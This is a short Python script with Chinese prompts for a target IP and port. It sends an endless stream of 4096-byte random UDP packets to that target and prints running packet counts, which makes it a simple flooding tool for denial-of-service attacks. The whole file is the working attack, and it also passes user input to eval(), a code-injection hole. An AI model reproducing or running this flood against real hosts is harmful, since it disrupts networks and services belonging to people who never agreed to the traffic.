import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bc=0
ip = input("对方IP:")
port = eval(input("端口:"))
byte=4096
sent = 0
while True:
     bytes_count = random._urandom(byte)
     sock.sendto(bytes_count, (ip,port))
     sent = sent + 1
     print("发送了%s个包到%s的%s端口: (已发送总量: %s)"%(sent,ip,port,bc))
     bc = bc + len(bytes_count)
